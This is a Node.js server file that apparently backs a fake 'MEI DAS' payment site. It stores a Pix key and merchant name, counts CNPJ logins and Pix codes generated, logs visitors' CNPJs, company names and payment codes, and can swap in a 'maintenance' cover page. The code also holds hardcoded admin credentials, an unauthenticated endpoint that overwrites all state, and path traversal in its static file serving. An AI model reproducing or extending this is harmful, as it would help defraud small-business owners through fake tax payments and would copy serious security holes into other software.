const http = require("http");
const fs = require("fs");
const path = require("path");
const { URL } = require("url");

const host = "127.0.0.1";
const port = 8080;
const root = __dirname;
const stateFilePath = path.join(root, "app-state.json");

const contentTypes = {
  ".html": "text/html; charset=utf-8",
  ".js": "application/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".png": "image/png",
  ".jpg": "image/jpeg",
  ".jpeg": "image/jpeg",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon"
};

const defaultState = {
  admin: {
    username: "macaco",
    password: "macaquinhoronald"
  },
  analytics: {
    visits: 0,
    uniqueVisitors: 0,
    totalClicks: 0,
    cnpjLogins: 0,
    pixGenerated: 0,
    paymentsConfirmed: 0,
    activePage: "primary",
    primaryDomain: "albuquerqueconsultoriameidas.com",
    pixKey: "6769b9cc-dae0-46f1-88db-3144cc4a7ca7",
    pixMerchantName: "SERVICO EMPRESARIAL ASSEGURADO ILTDA",
    pixMerchantCity: "SAO PAULO",
    secondaryTitle: "Estamos em manutencao",
    secondaryMessage: "A equipe da Albuquerque Consultoria MEI DAS esta realizando melhorias para oferecer uma experiencia mais rapida, segura e confiavel. Em breve o atendimento sera retomado.",
    lastVisitAt: "",
    lastPaymentAt: "",
    accessLog: [],
    payments: []
  }
};

function ensureStateFile() {
  if (!fs.existsSync(stateFilePath)) {
    fs.writeFileSync(stateFilePath, JSON.stringify(defaultState, null, 2), "utf8");
  }
}

function mergeState(rawState) {
  return {
    admin: {
      ...defaultState.admin,
      ...(rawState && rawState.admin ? rawState.admin : {})
    },
    analytics: {
      ...defaultState.analytics,
      ...(rawState && rawState.analytics ? rawState.analytics : {})
    }
  };
}

function normalizeState(rawState) {
  const merged = mergeState(rawState);

  if (!["primary", "secondary"].includes(merged.analytics.activePage)) {
    merged.analytics.activePage = "primary";
  }

  merged.analytics.accessLog = Array.isArray(merged.analytics.accessLog)
    ? merged.analytics.accessLog.slice(0, 8)
    : [];
  merged.analytics.payments = Array.isArray(merged.analytics.payments)
    ? merged.analytics.payments.slice(0, 8)
    : [];

  return merged;
}

function readState() {
  ensureStateFile();
  try {
    const raw = fs.readFileSync(stateFilePath, "utf8");
    return normalizeState(JSON.parse(raw));
  } catch (error) {
    return normalizeState(defaultState);
  }
}

function writeState(nextState) {
  const merged = normalizeState(nextState);
  fs.writeFileSync(stateFilePath, JSON.stringify(merged, null, 2), "utf8");
  return merged;
}

function sendJson(res, statusCode, data) {
  res.statusCode = statusCode;
  res.setHeader("Content-Type", "application/json; charset=utf-8");
  res.end(JSON.stringify(data));
}

function readRequestBody(req) {
  return new Promise((resolve, reject) => {
    let body = "";

    req.on("data", (chunk) => {
      body += chunk;
      if (body.length > 1024 * 1024) {
        reject(new Error("Payload too large"));
      }
    });

    req.on("end", () => resolve(body));
    req.on("error", reject);
  });
}

function handleApiAction(req, res, requestUrl) {
  const action = requestUrl.searchParams.get("action");

  if (!action || action === "get") {
    sendJson(res, 200, readState());
    return true;
  }

  if (action === "set_active_page") {
    const state = readState();
    state.analytics.activePage = requestUrl.searchParams.get("page") === "secondary" ? "secondary" : "primary";
    sendJson(res, 200, writeState(state));
    return true;
  }

  if (action === "update_settings") {
    const state = readState();
    const title = (requestUrl.searchParams.get("secondaryTitle") || "").trim();
    const message = (requestUrl.searchParams.get("secondaryMessage") || "").trim();

    if (title) {
      state.analytics.secondaryTitle = title;
    }
    if (message) {
      state.analytics.secondaryMessage = message;
    }

    sendJson(res, 200, writeState(state));
    return true;
  }

  if (action === "track_visit") {
    const state = readState();
    const now = new Date().toISOString();
    state.analytics.visits += 1;
    state.analytics.lastVisitAt = now;

    if (requestUrl.searchParams.get("unique") === "1") {
      state.analytics.uniqueVisitors += 1;
    }

    state.analytics.accessLog.unshift({
      time: now,
      page: requestUrl.searchParams.get("page") === "secondary" ? "secondary" : "primary",
      location: (requestUrl.searchParams.get("location") || "/").trim()
    });

    sendJson(res, 200, writeState(state));
    return true;
  }

  if (action === "increment_metric") {
    const state = readState();
    const metric = requestUrl.searchParams.get("metric") || "";
    const amount = Math.max(1, Number.parseInt(requestUrl.searchParams.get("amount") || "1", 10) || 1);
    const allowedMetrics = new Set(["totalClicks", "cnpjLogins", "pixGenerated", "paymentsConfirmed"]);

    if (!allowedMetrics.has(metric)) {
      sendJson(res, 400, { error: "Invalid metric" });
      return true;
    }

    state.analytics[metric] = (state.analytics[metric] || 0) + amount;
    sendJson(res, 200, writeState(state));
    return true;
  }

  if (action === "log_payment") {
    const state = readState();
    const now = new Date().toISOString();

    state.analytics.pixGenerated += 1;
    state.analytics.lastPaymentAt = now;
    state.analytics.payments.unshift({
      label: (requestUrl.searchParams.get("label") || "Pagamento Pix").trim(),
      amount: (requestUrl.searchParams.get("amount") || "R$ 0,00").trim(),
      status: "Pendente",
      time: now,
      cnpj: (requestUrl.searchParams.get("cnpj") || "").trim(),
      companyName: (requestUrl.searchParams.get("companyName") || "Razao social nao informada").trim(),
      code: (requestUrl.searchParams.get("code") || "").trim()
    });

    sendJson(res, 200, writeState(state));
    return true;
  }

  sendJson(res, 405, { error: "Method not allowed" });
  return true;
}

http
  .createServer(async (req, res) => {
    const requestUrl = new URL(req.url, `http://${host}:${port}`);
    const reqPath = requestUrl.pathname;

    if (reqPath === "/api/state" || reqPath === "/api/state.php") {
      res.setHeader("Access-Control-Allow-Origin", "*");
      res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
      res.setHeader("Access-Control-Allow-Headers", "Content-Type");
      res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");

      if (req.method === "OPTIONS") {
        res.statusCode = 204;
        res.end();
        return;
      }

      if (req.method === "GET") {
        handleApiAction(req, res, requestUrl);
        return;
      }

      if (req.method === "POST") {
        try {
          const body = await readRequestBody(req);
          const parsed = body ? JSON.parse(body) : {};
          sendJson(res, 200, writeState(parsed));
        } catch (error) {
          sendJson(res, 400, { error: "Invalid state payload" });
        }
        return;
      }

      sendJson(res, 405, { error: "Method not allowed" });
      return;
    }

    let normalizedPath = decodeURIComponent(reqPath);
    if (normalizedPath === "/") {
      normalizedPath = "/index.html";
    }

    let filePath = path.join(root, normalizedPath);

    fs.stat(filePath, (statError, stats) => {
      if (!statError && stats.isDirectory()) {
        filePath = path.join(filePath, "index.html");
      }

      fs.readFile(filePath, (readError, data) => {
        if (readError) {
          res.statusCode = 404;
          res.end("Not found");
          return;
        }

        const ext = path.extname(filePath).toLowerCase();
        res.setHeader("Content-Type", contentTypes[ext] || "application/octet-stream");
        res.end(data);
      });
    });
  })
  .listen(port, host, () => {
    ensureStateFile();
    console.log(`Local server running at http://${host}:${port}`);
  });
